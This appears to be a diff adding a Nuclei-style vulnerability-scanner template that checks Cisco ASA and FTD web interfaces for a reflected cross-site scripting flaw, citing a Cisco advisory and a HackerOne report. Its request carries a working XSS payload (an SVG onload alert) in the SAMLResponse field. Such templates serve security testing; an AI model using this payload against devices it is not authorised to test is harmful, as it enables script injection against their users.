@@ -1,0 +1,27 @@
+id: cisco-endpoint-xss
+info:
+  name: XSS in Cisco Endpoint
+  author: badhacker0x1
+  severity: high
+  description: Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device.
+  reference:
+    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-xss-multiple-FCB3vPZe
+    - https://hackerone.com/reports/2233421
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/+CSCOE+/saml/sp/acs?tgname=a"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+      Connection: close
+      Hackerone: badhacker0x1
+      Content-Length: 72
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Encoding: gzip, deflate, br
+    body: "SAMLResponse=%22%3E%3Csvg/onload=alert(/2XUkWJ29OE88uyTbdZ3a2UmA828/)%3E"
+    matchers:
+      - type: word
+        words:
+          - "<svg/onload=alert(/2XUkWJ29OE88uyTbdZ3a2UmA828/)>"
+        part: body
